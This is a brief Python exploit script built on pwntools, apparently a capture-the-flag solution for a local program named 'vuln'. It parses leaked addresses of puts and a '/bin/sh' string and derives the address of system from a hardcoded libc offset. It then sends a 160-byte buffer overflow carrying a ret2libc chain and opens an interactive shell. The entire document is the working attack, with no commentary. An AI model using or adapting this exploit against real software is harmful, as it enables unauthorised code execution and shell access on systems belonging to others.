#!/usr/bin/env python

from pwn import *
import re

elf = ELF('./vuln')
p = elf.process()

prompt = p.recv()

puts = int(re.findall('puts: (.*)',prompt)[0],16)
bin_sh = int(re.findall('useful_string: (.*)',prompt)[0],16)

system = puts - 0x24800

payload = ('A'*160)
payload += p32(system)
payload += ('JUNK')
payload += p32(bin_sh)

p.sendline(payload)
p.interactive()